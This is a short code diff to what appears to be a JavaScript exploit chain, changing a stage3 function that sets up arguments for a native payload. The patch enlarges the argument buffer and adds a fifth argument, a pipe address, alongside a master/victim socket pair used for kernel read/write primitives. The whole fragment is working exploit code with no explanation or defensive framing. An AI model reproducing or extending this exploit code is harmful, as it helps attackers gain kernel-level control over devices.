@@ -1560,7 +1560,7 @@ function stage3() {
 	// Arguments to entrypoint
 	
 	let rwpair_mem              = p.malloc(0x8);
-	let args                    = p.malloc(0x8 * 4);
+	let args                    = p.malloc(0x8 * 5);
 
 	// Pass master/victim pair to payload so it can do read/write
 	p.write4(rwpair_mem.add32(0x00), master_socket);
@@ -1570,7 +1570,7 @@ function stage3() {
 	p.write8(args.add32(0x08), pipe_mem);         						// arg2 = int *rwpipe[2]
 	p.write8(args.add32(0x10), rwpair_mem);         					// arg3 = int *rwpair[2]
 	p.write8(args.add32(0x18), proc);          							// arg4 = uint64_t proc
-	
+	p.write8(args.add32(0x20), pipe_addr);								// arg5 = uint64_t pipe_addr
 	
 	let pthread_handle_store = p.malloc(0x8);
 	let pthread_value_store = p.malloc(0x8);
